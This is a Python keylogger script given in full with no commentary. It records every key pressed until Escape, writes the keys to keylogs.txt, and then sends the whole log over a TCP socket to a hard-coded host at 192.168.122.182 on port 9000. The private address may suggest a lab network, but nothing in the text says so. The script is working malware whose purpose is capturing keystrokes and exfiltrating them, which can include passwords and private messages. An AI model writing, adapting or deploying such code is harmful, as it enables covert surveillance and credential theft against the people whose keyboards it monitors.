import keyboard
import socket
import time
import os

def main():
    log_file = 'keylogs.txt'
    server_ip = '192.168.122.182'
    port = 9000

    if not os.path.exists(log_file):
        with open(log_file, 'w') as f:
            pass

    while True:
        try:
            for event in keyboard.record(until='esc'):
                if event.event_type == keyboard.KEY_DOWN:
                    key = str(event.name)
                    with open(log_file, 'a') as f:
                        f.write(key)
                    print(f'Key {key} pressed')
            break

        except keyboard.errors.DeviceNotFoundError:
            print('No keyboard found.')
            time.sleep(5)

    with open(log_file, 'r') as f:
        keylogs = f.read()

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_ip, port))
            s.sendall(keylogs.encode())
            print('Keylogs sent successfully')

    except ConnectionRefusedError:
        print('Connection refused by the server')

if __name__ == '__main__':
    main()